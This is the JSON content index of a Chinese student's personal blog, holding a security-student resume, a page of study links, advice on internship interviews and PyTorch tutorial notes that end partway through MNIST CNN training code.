{"meta":{"title":"Lxm's Blog","subtitle":"","description":"","author":"Lxm","url":"https://gitee.com/michelle19l/michelle19l","root":"/"},"pages":[{"title":"Information","date":"2020-02-14T13:42:10.000Z","updated":"2022-02-16T08:57:31.137Z","comments":true,"path":"about/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/about/index.html","excerpt":"","text":"基本信息 本科 南开大学(NKU) 网络空间安全学院 18级 信息安全专业 在读（2022届毕业生） GPA：88.99 (3/34) 六级：544 托福：101 项目经历：个人项目 基于DES加密的TCP聊天系统、基于RSA算法自动分配密钥的聊天程序 https://github.com/michelle19l/CyberSercurityTech pagerank https://github.com/Emanual20/2021NKU_MassiveData_hw1 推荐系统 https://gitee.com/michelle19l/RecomSys lex+yacc编写简易编译器 https://github.com/michelle19l/compiler mysql+pymysql+flask+js 航班购票管理系统 https://github.com/michelle19l/domestic-flight-system c++ 简易聊天程序（可发送文字+图片）+拥塞控制 代码：https://github.com/michelle19l/3_1/tree/main/%E7%BD%91%E7%BB%9C 报告：https://michelle19l.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/ c++ + WPcap实现简易路由器 https://github.com/michelle19l/3_1/tree/main/%E7%BD%91%E6%8A%80/%E8%B7%AF%E7%94%B1%E5%99%A8 c++ 实现移位密码、DES、AES、RSA、SM4加密运算 https://github.com/michelle19l/cipher Qt 计算器、画板、影音播放器 https://michelle19l.github.io/categories/Qt/ 科研项目 2019.7 – 至今 南开大学信息安全新技术实验室 实习 1. 2021.5 – 2021.6 参与项目“基于IF条件分支切割的模糊测试系统” 组长 对程序源码中的if-else分支进行分割，生成满足分支条件约束的模糊测试初始输入 参加“全国大学生信息安全竞赛（作品赛）”并获得全国三等奖 目前已经申请到软件著作权，专利申请正在受理，相关论文已投出 2. 2020.3 – 至今 参与项目“基于二进制代码切割的模糊测试效率改进” 组长 - 对程序的二进制代码（汇编）进行修改，使用强制跳转达到切割效果 - 国创项目3. 2019.7 - 2020.3 参与科研项目“基于Maltrail的威胁情报分析” - 利用crontab定时爬取各个网站公布的恶意域名和IP - 使用pandas对爬取到的情报进行分析，使用superset对结果进行可视化 2021.3 – 至今 南开大学DBIS实验室 实习 阅读VQA领域相关英文论文，进行相关科研工作 实习项目 2020.5 – 2021.9 杭州安恒信息技术股份有限公司 实习参与项目“密码工具测评箱”，并在“2021年安恒hackathon”比赛中获得一等奖 基于argparse的命令行工具 对密码等级进行评判，并给出相应详细信息。适用于单条和多条密码 2021.10 至今 字节跳动 后端开发岗位 实习 学习专业课程： 大一上：高数、线代、C++、计算机概论 大一下：高数、大物 大一小学期：高级语言程序开发（Qt）、R语言（通识选修）、Matlab（通识选修） 大二上：数据结构、模电、数字逻辑、概率论、python 大二下：算法导论、信安数基、离散数学、计算机组成原理、漏洞利用及渗透测试、计算方法、数据库系统 大三上：计算机网络、密码学、网络技术与应用、操作系统、编译原理 大三下：计算机病毒及其防治、大数据计算及应用、网络安全技术 获奖经历 第十四届全国大学生信息安全竞赛（作品赛）全国三等奖 第十二届全国大学生信息安全竞赛（创新能力实践赛）赛区三等奖 2019-2020学年度 “公能”奖学金（获奖率：5%） 2018-2019学年度 “学业创新”奖学金（获奖率：10%） 2019年“希望之星”英语演讲比赛校二等奖、天津市优秀奖 2018-2019学年度院级优秀团员、2019-2020学年度院级优秀团员"},{"title":"分类","date":"2020-02-14T10:23:36.000Z","updated":"2020-04-12T15:30:33.247Z","comments":true,"path":"categories/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/categories/index.html","excerpt":"","text":""},{"title":"diaries","date":"2020-02-14T10:23:36.000Z","updated":"2020-03-15T06:43:03.937Z","comments":true,"path":"diary/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/diary/index.html","excerpt":"","text":""},{"title":"guide","date":"2020-03-24T03:26:56.000Z","updated":"2020-04-24T06:09:15.233Z","comments":true,"path":"guide/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/guide/index.html","excerpt":"","text":"==网站网址集合，欢迎推荐==学习课程 bilibili大学：https://www.bilibili.com/ 雨课堂网页版：https://changjiang.yuketang.cn/web 莫凡PYTHON：https://morvanzhou.github.io/ coursera：https://www.coursera.org/ 廖雪峰：https://www.liaoxuefeng.com/ leancloud：https://www.leancloud.cn/tutorials/ w3cschool：https://www.w3cschool.cn/ 练习代码 洛谷：https://www.luogu.com.cn/ codeforces：http://codeforces.com/contests 英语 小站托福：https://top.zhan.com/toefl/ 办公 学生邮箱：https://qiye.163.com/login/ webvpn：https://webvpn.nankai.edu.cn/ 功能（博主自己使用） 网站内容更新：https://gitee.com/michelle19l/michelle19l/pages"},{"title":"友情链接","date":"2020-02-14T10:23:36.000Z","updated":"2020-04-12T16:11:15.193Z","comments":true,"path":"link/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/link/index.html","excerpt":"","text":""},{"title":"电影","date":"2020-04-12T16:34:39.000Z","updated":"2020-04-13T07:57:11.942Z","comments":true,"path":"movies/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/movies/index.html","excerpt":"","text":""},{"title":"学习相关","date":"2020-02-14T11:16:19.000Z","updated":"2020-03-15T06:43:46.597Z","comments":true,"path":"study/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/study/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-02-14T11:16:19.000Z","updated":"2020-04-12T15:30:21.527Z","comments":true,"path":"tags/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/tags/index.html","excerpt":"","text":""},{"title":"音乐","date":"2020-04-12T16:29:25.000Z","updated":"2020-04-13T06:55:06.591Z","comments":true,"path":"music/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/music/index.html","excerpt":"","text":"南开大学闭馆音乐"},{"title":"timeline","date":"2020-02-16T05:51:18.000Z","updated":"2020-02-16T09:19:28.455Z","comments":true,"path":"timeline/index.html","permalink":"https://gitee.com/michelle19l/michelle19l/timeline/index.html","excerpt":"","text":""}],"posts":[{"title":"互联网公司实习面试总结","slug":"经验总结/实习","date":"2022-02-11T05:06:36.000Z","updated":"2022-02-16T11:35:25.007Z","comments":true,"path":"2022/02/11/经验总结/实习/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2022/02/11/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/%E5%AE%9E%E4%B9%A0/","excerpt":"","text":"互联网公司后端开发岗位面试经验分享 以下仅为个人见解，欢迎指正 ​ 本文主要是想分享一下自己在找实习过程中的一些经验 ​ 挖个坑，下篇文章写简历撰写经验 个人情况​ 先说一下个人背景情况可以做下参考 ​ 某985程序媛，没有开发岗位实习经历 ​ 通过了字节的后端开发实习岗和华为的秋招 经验分享招聘信息获取渠道​ 我这里都是通过各个公司的官网投递的，没有通过其他找工作的平台 岗位选择​ 其实有很多同学都担心自己会的东西不多，过往经历不是很丰富就不敢去投递这家公司，包括我自己一开始也有这样的顾虑。后来面试了几轮之后感觉实习生（实习生必须是在校生或者是拿到其他学校offer的准研究生）来说由于对于这个领域的接触时间较短，且大多没有丰富的工作经验，所以相较于“会多少”，面试官往往更在乎的是在未来的工作需要用到某项技能时“能学会多少”。所以在面试的时候面试官往往会更加关注你的基础知识是否牢固以及你是否能够清晰表达出自己的想法 ​ 前些日子看到有位同事提醒实习生的话：“我们招的是实习生，不是technical leader，所以不懂没什么大不了的，不懂就问。”我想这句话同样适用于实习面试过程——有不懂的知识是很正常的事情。 ​ 另外一个我想说的是如果经历有限且对于知识的把握程度不是特别好，建议各个公司投递的岗位尽量相同。因为在面试的准备过程中需要进行大量的知识储备，换句话来说就是背八股文（面试过程中经常被问到的基础知识）。投递工作内容相近的岗位可以帮助缩减复习范围，总结面试经验 面试流程 自我介绍 详细介绍过往项目经历的其中一个 计算机学课基础知识提问（八股文），个人简历相关知识提问 手撕代码（现场做编程题） 每次面试大概一个小时左右，一个小时连续集中注意力+高强度输出，对于体力的消耗还是挺大的，做好心里准备。 准备简历​ 这里特别感谢帮我改简历的t老师 ​ 一般来说在简历初筛阶段工作人员可能没有时间详细阅读你的简历，所以第一印象还是很重要的，个人认为，简历需要有三个条件——清晰、充实、有亮点。目的是可以让阅读这份简历的人可以在较短的时间内了解你的长处。关于具体的写简历经验等我有时间的时候再详细介绍吧。 基础知识​ 实习生和校招生在面试时被问到的知识大多是八股文，也就是计算机学课几大基础课程中经常在面试中被问道的问题，网上有很多面经总结大家可以搜一下，个人建议，一定要背八股文，有人可能觉得背八股文比较死板，但是跟人感觉在背的过程可以帮助我回忆这几年学的基础知识，并且有一个更偏向企业应用的总体架构层面上的理解，就算在面试中没有被问道，对于像我这种本科三年学习像狗熊掰棒子一样考完就忘的人，背面经能够很好地帮我构建知识体系，还是很有帮助的 ​ 我一开始复习的时候由于科目和考研相近就去看了考研课程，我感觉自己对于计算机基础课还算是有一点点基础的，看考研课感觉有点像从零学起，看了一段时间之后觉得效率太低，内容也不太适合面试就弃了，直接看八股文面经总结效率高很多。 主要科目以及高频问题： 计算机网络（三次握手、四次挥手、tcp和udp的区别） 操作系统（进程和线程的区别；进程的通信方式；线程的通信方式） 岗位相关课程知识：C++、数据库（读锁写锁脏读幻读、mysql语句） 数据结构（没有遇到过直接问的，但是现场写代码时会涉及） 编程能力 手撕代码 面试过程中一般都会让你现场写一两个题并讲解思路，时间大概在二十分钟左右，时间比较短所以代码不会太繁琐 建议刷剑指offer，一定要自己写一遍，不要看着觉得会了就过了。。 编程能力积累 如果是春招秋招需要编程笔试的建议平时刷刷题，实习一般没有笔试 其他 不要因为被问到不会的内容就害怕，就像我前面说到的那样，面试官本就不会要求一个实习生或者校招生什么都懂，反而一定会问到你的知识上限，也就是你不懂的地方，这样才能评估你的水平 不要不懂装懂，ta问的东西一定是他懂的，编了也没用，随便编造可能反而会拉低印象分 注重表达能力，公司非常看重团队工作，沟通很重要，认真听取他人的想法、清晰表达自己的思路都是非常重要的 我当时不断地“面了挂，挂了面”，当时有兄弟跟我说“所以叫挂面”，还是挺形象的。面试挂掉是很常见的事情，尤其是前面几场，对于整体面试流程和提问重点还不熟悉的时候，并且是否录用并不取决于面试者的个人能力，可能还和”每周到岗天数“”实习期限长短“”你的特长是否是该组所缺少的“或者”性格是否适合这项工作“等等等有关，所以就算面试不成功，即时复盘总结、调整心态准备下一场才是最重要的。","categories":[{"name":"实习","slug":"实习","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E5%AE%9E%E4%B9%A0/"}],"tags":[{"name":"实习","slug":"实习","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%AE%9E%E4%B9%A0/"}]},{"title":"pytorch中引入mnist数据集","slug":"python/pytorch/mnist文件引入","date":"2021-04-16T02:04:18.000Z","updated":"2021-04-16T07:59:18.545Z","comments":true,"path":"2021/04/16/python/pytorch/mnist文件引入/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/04/16/python/pytorch/mnist%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5/","excerpt":"","text":"关于数据集FashionMNist，可以选择在代码中下载，也可以手动下载https://gitee.com/mirrors/Fashion-MNIST/ mnist_train = torchvision.datasets.FashionMNIST( root='data/fashion/', train=True, download=True, transform=torchvision.transforms.ToTensor()) 路径结构为 如果download=True，则等待下载即可。如果手动下载，注意在变量root路径下建立FashionMNIST文件夹（和torchvision.datasets.FashioMNIST中的FashionMNIST相同），将下载内容放入raw中（解压不解压均可） 注意，如果没有processed文件夹中的内容，依然需要设置download=True，建议直接设置为download=True，代码将自动检测是否需要下载数据集 如果设置不好将会报错：RuntimeError: Dataset not found. 当然也可以只放入processed文件夹，这时download=False即可 train_data_ = torchvision.datasets.MNIST( # 在root下创建文件夹\"MNIST\" root='./mnist', train=True, transform=torchvision.transforms.ToTensor(), # np array(pixel)修改为tensor （0，255）-&gt;（0，1） download=False)","categories":[{"name":"pytorch","slug":"pytorch","permalink":"https://gitee.com/michelle19l/michelle19l/categories/pytorch/"}],"tags":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/tags/python/"},{"name":"机器学习","slug":"机器学习","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"pytorch","slug":"pytorch","permalink":"https://gitee.com/michelle19l/michelle19l/tags/pytorch/"}]},{"title":"莫烦python pytorch学习","slug":"python/pytorch/morvan","date":"2021-03-31T02:04:18.000Z","updated":"2021-04-16T07:39:02.541Z","comments":true,"path":"2021/03/31/python/pytorch/morvan/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/03/31/python/pytorch/morvan/","excerpt":"","text":"pytorch和numpyimport torchimport numpy as np# numpy和torch的转换np_data = np.arange(6).reshape((2, 3))# 2行3列torch_data = torch.from_numpy(np_data)tensor2array = torch_data.numpy()print( '\\nnumpy array:', np_data, # [[0 1 2], [3 4 5]] '\\ntorch tensor:', torch_data, # 0 1 2 \\n 3 4 5 [torch.LongTensor of size 2x3] '\\ntensor to array:', tensor2array, # [[0 1 2], [3 4 5]]) 如果是nparray，直接使用from_numpy(data)即可如果是普通数组，使用torch.FloatTensor(data) # 数学运算# abs 计算绝对值data=[-1,-2,1,2]tensor=torch.FloatTensor(data)#转换成32位浮点tensor# 或# data=[-1,-2,1,2]# tensor=torch.from_numpy(np.array(data))print( '\\nabs', '\\nnumpy: ', np.abs(data), # [1 2 1 2] '\\ntorch: ', torch.abs(tensor) # [1 2 1 2])# sin 三角函数 sinprint( '\\nsin', '\\nnumpy: ', np.sin(data), # [-0.84147098 -0.90929743 0.84147098 0.90929743] '\\ntorch: ', torch.sin(tensor) # [-0.8415 -0.9093 0.8415 0.9093])# mean 均值print( '\\nmean', '\\nnumpy: ', np.mean(data), # 0.0 '\\ntorch: ', torch.mean(tensor) # 0.0) # matrix multiplication 矩阵点乘data = [[1,2], [3,4]]tensor = torch.FloatTensor(data) # 转换成32位浮点 tensor# correct methodprint( '\\nmatrix multiplication (matmul)', '\\nnumpy: ', np.matmul(data, data), # [[7, 10], [15, 22]] '\\ntorch: ', torch.mm(tensor, tensor) # [[7, 10], [15, 22]])# !!!! 下面是错误的方法 !!!!data = np.array(data)print( '\\nmatrix multiplication (dot)', '\\nnumpy: ', data.dot(data), # [[7, 10], [15, 22]] 在numpy 中可行 '\\ntorch: ', tensor.dot(tensor) # torch 会转换成 [1,2,3,4].dot([1,2,3,4) = 30.0 # 该写法在我的python里直接报错了) variable 在 Torch 中的 Variable 就是一个存放会变化的值的地理位置. 里面的值会不停的变化. 就像一个裝鸡蛋的篮子, 鸡蛋数会不停变动. 那谁是里面的鸡蛋呢, 自然就是 Torch 的 Tensor 咯. 如果用一个 Variable 进行计算, 那返回的也是一个同类型的 Variable. import torchfrom torch.autograd import Variabletensor = torch.FloatTensor([[1, 2], [3, 4]])variable = Variable(tensor, requires_grad=True) # 需要生成梯度信息print(tensor)print(variable) tensor([[1., 2.], [3., 4.]])tensor([[1., 2.], [3., 4.]], requires_grad=True) print(tensor*tensor) # x^2 tensor([[ 1., 4.], [ 9., 16.]]) t_out = torch.mean(tensor*tensor) # x^2v_out = torch.mean(variable*variable) # x^2print(t_out)print(v_out) # 7.5 tensor(7.5000)tensor(7.5000, grad_fn=) Variable 计算时, 它在背景幕布后面一步步默默地搭建着一个庞大的系统, 叫做计算图, computational graph. 这个图是用来将所有的计算步骤 (节点) 都连接起来, 最后进行误差反向传递的时候, 一次性将所有 variable 里面的修改幅度 (梯度) 都计算出来, 而 tensor 就没有这个能力. v_out.backward() # 模拟 v_out 的误差反向传递# 下面两步看不懂没关系, 只要知道 Variable 是计算图的一部分, 可以用来传递误差就好.# v_out = 1/4 * sum(variable*variable) 这是计算图中的 v_out 计算步骤# 针对于 v_out 的梯度就是, d(v_out)/d(variable) = 1/4*2*variable = variable/2print(variable.grad) # 初始 Variable 的梯度''' 0.5000 1.0000 1.5000 2.0000''' print(variable) # Variable 形式\"\"\"Variable containing: 1 2 3 4[torch.FloatTensor of size 2x2]\"\"\"print(variable.data) # tensor 形式\"\"\" 1 2 3 4[torch.FloatTensor of size 2x2]\"\"\"print(variable.data.numpy()) # numpy 形式\"\"\"[[ 1. 2.] [ 3. 4.]]\"\"\" 激励函数梯度爆炸和梯度消失 CNN-&gt; relu rnn-&gt; relu or tanh 非线性函数 import torchimport torch.nn.functional as F # 激励函数都在这from torch.autograd import Variableimport matplotlib.pyplot as pltx = torch.linspace(-5, 5, 200) # [-5,5] 200个均分x = Variable(x)x_np = x.data.numpy() # 画图# 激励函数y_relu = F.relu(x).data.numpy()y_sigmoid = F.sigmoid(x).data.numpy()y_tanh = F.tanh(x).data.numpy()y_softplus = F.softplus(x).data.numpy()plt.figure(1, figsize=(8, 6))plt.subplot(221)plt.plot(x_np, y_relu, c='red', label='relu')plt.ylim((-1, 5))plt.legend(loc='best')plt.subplot(222)plt.plot(x_np, y_sigmoid, c='red', label='sigmoid')plt.ylim((-0.2, 1.2))plt.legend(loc='best')plt.subplot(223)plt.plot(x_np, y_tanh, c='red', label='tanh')plt.ylim((-1.2, 1.2))plt.legend(loc='best')plt.subplot(224)plt.plot(x_np, y_softplus, c='red', label='softplus')plt.ylim((-0.2, 6))plt.legend(loc='best')plt.show() 关系拟合import torchimport torch.nn.functional as F # 激励函数都在这# 把一维数据编程二维x = torch.unsqueeze(torch.linspace(-1, 1, 100), dim=1) # x data (tensor), shape=(100, 1)# 增加噪点y = x.pow(2) + 0.2 * torch.rand(x.size()) # noisy y data (tensor), shape=(100, 1)class Net(torch.nn.Module): def __init__(self, n_features, n_hidden, n_output): super(Net, self).__init__() # 输入个数和隐藏层神经元个数 self.hidden = torch.nn.Linear(n_features, n_hidden) # 隐藏层 self.predict = torch.nn.Linear(n_hidden, n_output) # 输出层，如果只输出y，则output=1 def forward(self, x): x = F.relu(self.hidden(x)) # 对隐藏层使用激励函数 x = self.predict(x) # 输出值 return xnet = Net(n_features=1, n_hidden=10, n_output=1)print(net)# SGD优化器optimizer = torch.optim.SGD(net.parameters(), lr=0.2)loss_func = torch.nn.MSELoss() # 均方差，用于回归问题for t in range(100): # 100步训练 prediction = net(x) # 输出预测值 loss = loss_func(prediction, y) # 计算误差和真实的差 optimizer.zero_grad() # 将所有参数的梯度降为0 loss.backward() # 反向传递，计算参数更新值 optimizer.step() # 以lr优化 # 可以用于画图查看神经网络调整流程 分类import torchimport torch.nn.functional as F # 激励函数都在这from torch.autograd import Variableimport matplotlib.pyplot as plt# 假数据# 100行2列 1n_data = torch.ones(100, 2) # 数据的基本形态# 正态分布(means每个输出元素的均值,std标准差,out=None可选的输出张量)x0 = torch.normal(2 * n_data, 1) # 类型0 x data (tensor), shape=(100, 2)# 一维行向量y0 = torch.zeros(200) # 类型0 y data (tensor), shape=(100, )x1 = torch.normal(-2 * n_data, 1) # 类型1 x data (tensor), shape=(100, 1)y1 = torch.ones(200) # 类型1 y data (tensor), shape=(100, )# 注意 x, y 数据的数据形式是一定要像下面一样 (torch.cat 是在合并数据)# 有0，按行合并，没有按列x = torch.cat((x0, x1), 0).type(torch.LongTensor) # FloatTensor = 32-bit floatingy = torch.cat((y0, y1), ).type(torch.LongTensor) # LongTensor = 64-bit integer# y=0,y=1两个颜色plt.scatter(x.data.numpy()[:, 0], x.data.numpy()[:, 1], c=y.data.numpy(), s=100, lw=0, cmap='RdYlGn')plt.show()class Net(torch.nn.Module): def __init__(self, n_features, n_hidden, n_output): super(Net, self).__init__() # 输入个数和隐藏层神经元个数 self.hidden = torch.nn.Linear(n_features, n_hidden) # 隐藏层 self.predict = torch.nn.Linear(n_hidden, n_output) # 输出层，如果只输出y，则output=1 def forward(self, x): x = F.relu(self.hidden(x)) # 对隐藏层使用激励函数 x = self.predict(x) # 输出值 return x class Net(torch.nn.Module): def __init__(self, n_features, n_hidden, n_output): super(Net, self).__init__() # 输入个数和隐藏层神经元个数 self.hidden = torch.nn.Linear(n_features, n_hidden) # 隐藏层 self.predict = torch.nn.Linear(n_hidden, n_output) # 输出层，如果只输出y，则output=1 def forward(self, x): x = F.relu(self.hidden(x)) # 对隐藏层使用激励函数 x = self.predict(x) # 输出值 return xnet = Net(n_features=2, n_hidden=10, n_output=2) # 分成2类，output=2# 如果输出是[0,1]则分类为1# 如果输出为[1,0]则分类为0print(net)# SGD优化器optimizer = torch.optim.SGD(net.parameters(), lr=0.05)loss_func = torch.nn.CrossEntropyLoss() # 用于分类问题，softmax# 例 输出[0.1,0.2,0.7] 概率，根据这种形式计算误差for t in range(100): # 100步训练 out = net(x) # 输出预测值 loss = loss_func(out, y) # 计算误差和真实的差 optimizer.zero_grad() # 将所有参数的梯度降为0 loss.backward() # 反向传递，计算参数更新值 optimizer.step() # 以lr优化 快速搭建法net2=torch.nn.Sequential( torch.nn.Linear(2,10), torch.nn.ReLU(), # 类，搭建效果和class相同 torch.nn.Linear(10,2)) Net( (hidden): Linear(in_features=2, out_features=10, bias=True) (predict): Linear(in_features=10, out_features=2, bias=True))Sequential( (0): Linear(in_features=2, out_features=10, bias=True) (1): ReLU() (2): Linear(in_features=10, out_features=2, bias=True)) 保存提取torch.manual_seed(1) # reproducible,使每次的初始化固定# 假数据x = torch.unsqueeze(torch.linspace(-1, 1, 100), dim=1) # x data (tensor), shape=(100, 1)y = x.pow(2) + 0.2*torch.rand(x.size()) # noisy y data (tensor), shape=(100, 1)def save(): # 建网络 net1 = torch.nn.Sequential( torch.nn.Linear(1, 10), torch.nn.ReLU(), torch.nn.Linear(10, 1) ) optimizer = torch.optim.SGD(net1.parameters(), lr=0.5) loss_func = torch.nn.MSELoss() # 训练 for t in range(100): prediction = net1(x) loss = loss_func(prediction, y) optimizer.zero_grad() loss.backward() optimizer.step() torch.save(net1, 'net.pkl') # 保存整个网络 torch.save(net1.state_dict(), 'net_params.pkl') # 只保存网络中的参数 (速度快, 占内存少) def restore_net(): # restore entire net1 to net2 net2 = torch.load('net.pkl') prediction = net2(x)def restore_params(): # 新建 net3 net3 = torch.nn.Sequential( torch.nn.Linear(1, 10), torch.nn.ReLU(), torch.nn.Linear(10, 1) ) # 将保存的参数复制到 net3 net3.load_state_dict(torch.load('net_params.pkl')) prediction = net3(x) # 保存 net1 (1. 整个网络, 2. 只有参数)save()# 提取整个网络restore_net()# 提取网络参数, 复制到新网络restore_params() 批训练dataloader可以迭代地处理数据 import torchimport torch.utils.data as Datatorch.manual_seed(1) # reproducibleBATCH_SIZE = 8 # 批训练的数据个数x = torch.linspace(1, 10, 10) # x data (torch tensor)y = torch.linspace(10, 1, 10) # y data (torch tensor)# 先转换成 torch 能识别的 Dataset# 训练数据data_tensor,计算误差target_tensortorch_dataset = Data.TensorDataset(x, y)# 把 dataset 放入 DataLoaderloader = Data.DataLoader( dataset=torch_dataset, # torch TensorDataset format batch_size=BATCH_SIZE, # mini batch size shuffle=True, # 要不要打乱数据 (打乱比较好) num_workers=0, # 多线程来读数据，0为默认值)for epoch in range(3): # 训练所有!整套!数据 3 次 # 可以设置是否打乱数据 shuffle # enumerate 索引 for step, (batch_x, batch_y) in enumerate(loader): # 每一步 loader 释放一小批数据用来学习 # 假设这里就是你训练的地方... # 打出来一些数据 print('Epoch: ', epoch, '| Step: ', step, '| batch x: ', batch_x.numpy(), '| batch y: ', batch_y.numpy()) Epoch: 0 | Step: 0 | batch x: [ 5. 7. 10. 3. 4. 2. 1. 8.] | batch y: [ 6. 4. 1. 8. 7. 9. 10. 3.]Epoch: 0 | Step: 1 | batch x: [9. 6.] | batch y: [2. 5.]Epoch: 1 | Step: 0 | batch x: [ 4. 6. 7. 10. 8. 5. 3. 2.] | batch y: [7. 5. 4. 1. 3. 6. 8. 9.]Epoch: 1 | Step: 1 | batch x: [1. 9.] | batch y: [10. 2.]Epoch: 2 | Step: 0 | batch x: [ 4. 2. 5. 6. 10. 3. 9. 1.] | batch y: [ 7. 9. 6. 5. 1. 8. 2. 10.]Epoch: 2 | Step: 1 | batch x: [8. 7.] | batch y: [3. 4.] 优化器optimizerimport torchimport torch.utils.data as Dataimport torch.nn.functional as Fimport matplotlib.pyplot as plttorch.manual_seed(1) # reproducibleLR = 0.01BATCH_SIZE = 32EPOCH = 12# fake datasetx = torch.unsqueeze(torch.linspace(-1, 1, 1000), dim=1)y = x.pow(2) + 0.1 * torch.normal(torch.zeros(*x.size()))# plot datasetplt.scatter(x.numpy(), y.numpy())plt.show()# 使用上节内容提到的 data loadertorch_dataset = Data.TensorDataset(x, y)loader = Data.DataLoader(dataset=torch_dataset, batch_size=BATCH_SIZE, shuffle=True, num_workers=0)# 默认的 network 形式class Net(torch.nn.Module): def __init__(self): super(Net, self).__init__() self.hidden = torch.nn.Linear(1, 20) # hidden layer self.predict = torch.nn.Linear(20, 1) # output layer def forward(self, x): x = F.relu(self.hidden(x)) # activation function for hidden layer x = self.predict(x) # linear output return x# 为每个优化器创建一个 netnet_SGD = Net()net_Momentum = Net()net_RMSprop = Net()net_Adam = Net()nets = [net_SGD, net_Momentum, net_RMSprop, net_Adam]# different optimizersopt_SGD = torch.optim.SGD(net_SGD.parameters(), lr=LR)opt_Momentum = torch.optim.SGD(net_Momentum.parameters(), lr=LR, momentum=0.8)opt_RMSprop = torch.optim.RMSprop(net_RMSprop.parameters(), lr=LR, alpha=0.9)opt_Adam = torch.optim.Adam(net_Adam.parameters(), lr=LR, betas=(0.9, 0.99))optimizers = [opt_SGD, opt_Momentum, opt_RMSprop, opt_Adam]loss_func = torch.nn.MSELoss()losses_his = [[], [], [], []] # 记录 training 时不同神经网络的 lossfor epoch in range(EPOCH): # EPOCH=12 print('Epoch: ', epoch) for step, (b_x, b_y) in enumerate(loader): # 对每个优化器, 优化属于他的神经网络 for net, opt, l_his in zip(nets, optimizers, losses_his): # 后者都是list形式 output = net(b_x) # get output for every net loss = loss_func(output, b_y) # compute loss for every net opt.zero_grad() # clear gradients for next train loss.backward() # backpropagation, compute gradients opt.step() # apply gradients l_his.append(loss.data.numpy()) # loss recoder CNN收集一小块的图像信息，进行总结 mnist mnist数据集放在root下的\\MNIST\\processed文件夹下 import torchimport torch.nn as nnimport torch.utils.data as Dataimport torchvision # 数据库模块import matplotlib.pyplot as plt# Hyper ParametersEPOCH = 1 # 训练整批数据多少次, 为了节约时间, 我们只训练一次BATCH_SIZE = 50LR = 0.001 # 学习率DOWNLOAD_MNIST = False # 如果你已经下载好了mnist数据就写上 Falsetrain_data_ = torchvision.datasets.MNIST( root='./mnist', train=True, transform=torchvision.transforms.ToTensor(), # np array(pixel)修改为tensor （0，255）-&gt;（0，1） download=DOWNLOAD_MNIST)# 可以打印出数字图片plt.imshow(train_data_.train_data[1].numpy(), cmap=\"gray\")plt.show()print(train_data_)print(train_data_.train_data) 数据处理import torchimport torch.nn as nnimport torch.utils.data as Dataimport torchvision # 数据库模块import matplotlib.pyplot as plt# Hyper ParametersEPOCH = 1 # 训练整批数据多少次, 为了节约时间, 我们只训练一次BATCH_SIZE = 50LR = 0.001 # 学习率DOWNLOAD_MNIST = False # 如果你已经下载好了mnist数据就写上 Falsetrain_data_ = torchvision.datasets.MNIST( root='./mnist', train=True, transform=torchvision.transforms.ToTensor(), # np array(pixel)修改为tensor （0，255）-&gt;（0，1） download=DOWNLOAD_MNIST)test_data_ = torchvision.datasets.MNIST(root='./mnist', train=False)train_loader = Data.DataLoader(dataset=train_data_, batch_size=BATCH_SIZE, shuffle=True)# 为简化训练，只训练2000组# 将整数转换成小数，再除以255test_x = torch.unsqueeze(test_data_.test_data, dim=1).type(torch.FloatTensor)[:2000] / 255test_y = test_data_.test_labels[:2000] CNN模型搭建# CNN模型class CNN(nn.Module): def __init__(self): super(CNN, self).__init__() self.conv1 = nn.Sequential( # (1,28,28) nn.Conv2d( # 卷积层，filter（深度）☞在这一区域内提取出的特征个数 in_channels=1, # 输入层高度，黑白1，彩色3 out_channels=16, # filter个数，每块提取出16个特征 kernel_size=5, # filter宽和高都是5pixel 5x5，每次扫描25个像素点 stride=1, # 每步跳1个pixel，步长 padding=2, # 边框，提取边缘像素点特征 # 如果想要 con2d 出来的图片长宽没有变化, padding=(kernel_size-1)/2 当 stride=1 # output shape (16, 28, 28) ), nn.ReLU(), # 非线性激活层 # (16, 28, 28) nn.MaxPool2d( # 池化层，筛选重要的特征 kernel_size=2, # 长和宽为2的pooling，可以理解为提取2x2空间种的最大值，用于压缩长宽，但是高度不变 ) # (16, 14, 14) ) self.conv2 = nn.Sequential( # (16, 14, 14) nn.Conv2d(16, # input, conv1 outchannel=16 32, 5, # kernel_size 1, 2, ), # (32, 14, 14) nn.ReLU(), nn.MaxPool2d(2), # (32, 7, 7) ) self.out = nn.Linear(32 * 7 * 7, 10) # 输入，输出 def forward(self, x): # x表示输入的training数据 x = self.conv1(x) x = self.conv2(x) # （batch，32，7，7） x = x.view(x.size(0), -1) # 展平 -1把数据编程32*7*7 (batch,32*7*7) output = self.out(x) return outputcnn=CNN()print(cnn) CNN( (conv1): Sequential( (0): Conv2d(1, 16, kernel_size=(5, 5), stride=(1, 1), padding=(2, 2)) (1): ReLU() (2): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) ) (conv2): Sequential( (0): Conv2d(16, 32, kernel_size=(5, 5), stride=(1, 1), padding=(2, 2)) (1): ReLU() (2): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) ) (out): Linear(in_features=1568, out_features=10, bias=True)) 训练optimizer = torch.optim.Adam(cnn.parameters(), lr=LR) # optimize all cnn parametersloss_func = nn.CrossEntropyLoss() # the target label is not one-hotted# training and testingfor epoch in range(EPOCH): for step, (b_x, b_y) in enumerate(train_loader): # 分配 batch data, normalize x when iterate train_loader output = cnn(b_x) # cnn output loss = loss_func(output, 